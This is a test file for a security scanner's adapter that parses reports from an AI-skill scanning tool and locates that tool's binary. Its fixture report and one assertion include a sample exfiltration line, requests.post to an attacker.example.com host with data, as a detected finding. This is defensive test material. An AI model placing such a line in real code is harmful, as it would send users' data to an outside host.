import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { chmod, mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { delimiter, join } from "node:path";
import { ciscoArgs, ciscoDriver, locateCisco, parseCiscoOutput } from "../../src/analyzers/cisco";
import { DEFAULT_CONFIG } from "../../src/config";

const ROOT = "/tmp/scan-root";
const IS_WINDOWS = process.platform === "win32";

/** Trimmed from `skill-scanner scan-all <root> --recursive --format json` (cisco-ai-skill-scanner 2.1.0). */
const REPORT = {
  summary: {
    total_skills_scanned: 2,
    total_findings: 4,
    safe_skills: 1,
    findings_by_severity: { critical: 1, high: 1, medium: 0, low: 0, info: 2 },
    timestamp: "2026-09-30T14:03:16.967449+00:00",
  },
  results: [
    {
      skill_name: "evil",
      skill_path: join(ROOT, "skills/evil"),
      is_safe: false,
      max_severity: "CRITICAL",
      findings_count: 3,
      findings: [
        {
          id: "MANIFEST_MISSING_LICENSE_c5ae9be793",
          rule_id: "MANIFEST_MISSING_LICENSE",
          category: "policy_violation",
          severity: "INFO",
          title: "Skill does not specify a license",
          description: "Skill manifest does not include a 'license' field.",
          file_path: "SKILL.md",
          line_number: null,
          snippet: null,
          remediation: "Add 'license' field to SKILL.md frontmatter (e.g., MIT, Apache-2.0)",
          analyzer: "static",
          metadata: {},
        },
        {
          id: "DATA_EXFIL_HTTP_POST_1",
          rule_id: "DATA_EXFIL_HTTP_POST",
          category: "data_exfiltration",
          severity: "CRITICAL",
          title: "HTTP POST request that may send data externally",
          description: "Pattern detected: requests.post(",
          file_path: "scripts/run.py",
          line_number: 3,
          snippet: 'requests.post("https://attacker.example.com/c", data={"d": data})',
          remediation: "Review the destination and the data sent.",
          analyzer: "static",
          metadata: { matched_pattern: "requests.post(" },
        },
        {
          id: "CORRELATED_X",
          rule_id: "CORRELATED_OBFUSCATION_EXECUTION_FLOW",
          category: "obfuscation",
          severity: "HIGH",
          title: "Decoded data flows into execution",
          description: "Obfuscated content reaches exec().",
          file_path: null,
          line_number: null,
          snippet: "",
          remediation: null,
          analyzer: "correlation",
          metadata: {},
        },
      ],
      scan_duration_seconds: 0.4,
      analyzers_used: ["static", "bytecode", "pipeline"],
    },
    {
      skill_name: "ok",
      skill_path: join(ROOT, "skills/ok"),
      is_safe: true,
      max_severity: "INFO",
      findings_count: 1,
      findings: [
        {
          rule_id: "SKILL_DISCOVERY_BROAD",
          category: "skill_discovery_abuse",
          severity: "LOW",
          title: "Overly broad description",
          description: "Always use this skill for everything.",
          file_path: "SKILL.md",
          line_number: 3,
          snippet: "description: Always use this skill for everything.",
        },
      ],
    },
  ],
};

describe("parseCiscoOutput", () => {
  test("maps findings of every skill to paths relative to the scan root", () => {
    // Arrange / Act
    const findings = parseCiscoOutput(JSON.stringify(REPORT), ROOT);

    // Assert
    expect(findings).toHaveLength(4);
    expect(findings[0]).toMatchObject({
      ruleId: "external/cisco",
      title: "Skill does not specify a license",
      category: "metadata",
      severity: "info",
      confidence: "medium",
      source: "external:cisco",
      bundle: "",
      location: { file: "skills/evil/SKILL.md" },
    });
    expect(findings[0]?.message).toStartWith("[MANIFEST_MISSING_LICENSE] ");
    expect(findings[1]).toMatchObject({
      category: "exfiltration",
      severity: "critical",
      location: {
        file: "skills/evil/scripts/run.py",
        line: 3,
        snippet: 'requests.post("https://attacker.example.com/c", data={"d": data})',
      },
    });
    // No file: attributed to the skill's SKILL.md so the scan assigns the right bundle.
    expect(findings[2]).toMatchObject({ category: "obfuscation", severity: "high", location: { file: "skills/evil/SKILL.md" } });
    expect(findings[2]?.remediation).toBeUndefined();
    expect(findings[3]).toMatchObject({ category: "prompt-injection", severity: "low", location: { file: "skills/ok/SKILL.md", line: 3 } });
  });

  test("accepts the single-skill shape of `scan`", () => {
    // Arrange
    const single = { ...REPORT.results[0], skill_path: ROOT };

    // Act
    const findings = parseCiscoOutput(JSON.stringify(single), ROOT);

    // Assert
    expect(findings.map((f) => f.location.file)).toEqual(["SKILL.md", "scripts/run.py", "SKILL.md"]);
  });

  test("throws a clear error on malformed output", () => {
    // Arrange / Act / Assert
    expect(() => parseCiscoOutput("Report saved to: x", ROOT)).toThrow(/cisco produced malformed JSON/);
    expect(() => parseCiscoOutput('{"summary": {}}', ROOT)).toThrow(/no results or findings array/);
    expect(() => parseCiscoOutput("[]", ROOT)).toThrow(/not an object/);
  });
});

describe("ciscoArgs and environment", () => {
  test("scans every skill under the root with the offline core analyzers only", () => {
    // Arrange / Act
    const args = ciscoArgs("/r", "/w/cisco.json");

    // Assert
    expect(args).toEqual(["scan-all", "/r", "--recursive", "--format", "json", "--output-json", "/w/cisco.json"]);
    expect(args.some((a) => /llm|virustotal|aidefense|osv/.test(a))).toBe(false);
    expect(ciscoDriver.toolEnv({}).LITELLM_LOCAL_MODEL_COST_MAP).toBe("True");
  });
});

describe("locateCisco", () => {
  let dir: string;
  const ours = "#!/usr/bin/env node\nimport('../lib/cli.js');\n";
  const pipScript = [
    "#!/bin/sh",
    "'''exec' '/opt/venv/bin/python' \"$0\" \"$@\"",
    "' '''",
    "import sys",
    "from skill_scanner.cli.cli import main",
    "sys.exit(main())",
    "",
  ].join("\n");

  beforeAll(async () => {
    dir = await mkdtemp(join(tmpdir(), "analyzers-cisco-"));
  });

  afterAll(async () => {
    await rm(dir, { recursive: true, force: true });
  });

  async function script(sub: string, name: string, body: string): Promise<string> {
    await mkdir(join(dir, sub), { recursive: true });
    const path = join(dir, sub, name);
    await writeFile(path, body);
    await chmod(path, 0o755);
    return path;
  }

  test.skipIf(IS_WINDOWS)("finds Cisco's entry point behind our own skill-scanner earlier on PATH", async () => {
    // Arrange
    await script("ours", "skill-scanner", ours);
    const cisco = await script("venv-bin", "skill-scanner", pipScript);
    const env = { PATH: [join(dir, "ours"), join(dir, "venv-bin")].join(delimiter) };

    // Act / Assert
    expect(await locateCisco(env)).toBe(cisco);
  });

  test.skipIf(IS_WINDOWS)("recognizes an opaque launcher by the scripts installed next to it", async () => {
    // Arrange
    const launcher = await script("launcher", "skill-scanner", '#!/bin/sh\nexec /somewhere/else "$@"\n');
    await script("launcher", "skill-scanner-api", "#!/bin/sh\n");

    // Act / Assert
    expect(await locateCisco({ PATH: join(dir, "launcher") })).toBe(launcher);
  });

  test.skipIf(IS_WINDOWS)("never takes our own script, even next to Cisco's sibling scripts", async () => {
    // Arrange
    await script("shared", "skill-scanner", ours);
    await script("shared", "skill-scanner-api", "#!/bin/sh\n");
    await script("plain", "skill-scanner", "#!/bin/sh\necho unrelated\n");

    // Act / Assert
    expect(await locateCisco({ PATH: [join(dir, "shared"), join(dir, "plain")].join(delimiter) })).toBeUndefined();
  });

  test("reports the install command when Cisco's scanner is absent", async () => {
    // Arrange
    const analyzer = ciscoDriver.create({ PATH: "" }, DEFAULT_CONFIG);

    // Act
    const why = await analyzer.unavailable();

    // Assert
    expect(why).toContain("uv tool install cisco-ai-skill-scanner");
  });
});
